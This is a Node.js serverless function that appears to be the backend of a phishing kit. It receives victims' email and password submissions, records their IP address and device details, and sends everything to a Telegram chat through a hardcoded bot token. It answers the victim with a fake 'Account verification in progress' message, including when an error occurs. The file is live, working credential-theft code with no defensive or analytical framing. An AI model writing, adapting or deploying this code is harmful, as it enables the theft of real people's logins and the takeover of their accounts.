const https = require('https');

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS, GET',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'GET') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ status: 'ok', message: 'Function live' })
    };
  }

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 204, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  const BOT_TOKEN = '8844317817:AAFBfsmQuRneSNRVTY0j2FRvTRfTOuxBR4M';
  const CHAT_ID = '7168776529';

  try {
    const data = JSON.parse(event.body);
    const { email, password, timestamp, userAgent } = data;

    console.log('CAPTURE:', email, password);

    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                     event.headers['x-nf-client-connection-ip'] || 'unknown';

    const ua = userAgent || 'Unknown';
    const isMobile = /Mobile|Android|iPhone/i.test(ua);
    const device = isMobile ? '📱 Mobile' : '💻 Desktop';

    const time = timestamp ? new Date(timestamp).toLocaleString('en-US') : 'Unknown';

    const message = `🎯 *NEW CAPTURE*

👤 *Credentials*
├ Email: \`${email}\`
└ Password: \`${password}\`

🌐 *Target Info*
├ IP: \`${clientIP}\`
├ Device: ${device}
└ Time: ${time}

🔍 *User Agent*
\`${ua.substring(0, 300)}${ua.length > 300 ? '...' : ''}\`

📊 *Status:* ✅ Captured`;

    const payload = JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    await new Promise((resolve, reject) => {
      const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          console.log('Telegram response:', res.statusCode, data);
          resolve();
        });
      });
      req.on('error', reject);
      req.write(payload);
      req.end();
    });

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, message: 'Account verification in progress...' })
    };

  } catch (err) {
    console.error('Error:', err);
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, message: 'Account verification in progress...' })
    };
  }
};
